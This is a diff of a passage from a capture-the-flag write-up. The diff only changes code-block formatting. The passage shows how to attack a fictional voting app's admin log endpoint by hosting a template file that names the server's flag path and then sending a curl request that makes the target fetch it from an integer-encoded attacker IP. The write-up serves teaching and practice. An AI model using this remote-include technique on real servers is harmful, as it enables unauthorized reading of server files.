@@ -30,13 +30,13 @@ print(int(local_ip + target_ip, 2))
 Now that we have our address, we need to create our RSU file to fetch.
 ### Experimental Logging
 Further down in the `read_vote_file` function, there's a templating feature that allows us to include files on the server in our log results. The source code helps us out here by providing the path we need to include in our file. We don't need to add anything more than the template content as that will give us the flag on its own. Ensure the device you run these commands on has a public IP, as the challenge server will need to be able to reach it. We also can't specify a port in the host so we'll need to host our HTTP server on port 80. 
-```
+```shell
 dot@stuff-server:~$ echo "{/app/rsu/log_of_doom_flag.txt}" > flag.rsu
 dot@stuff-server:~$ python3 -m http.server 80
 ```
 Now that we have a server the challenge can reach, we can use our address from the Python script to create our curl request.
-```
-dot@stuff:~$ curl http://mobile-app.commission.freedonia.vote/api/admin/vote-logs?source=file&file=http://867653487826042880/flag.rsu
+```shell
+$ curl http://mobile-app.commission.freedonia.vote/api/admin/vote-logs?source=file&file=http://867653487826042880/flag.rsu
 {
 	"source": "file",
 	"votes": {
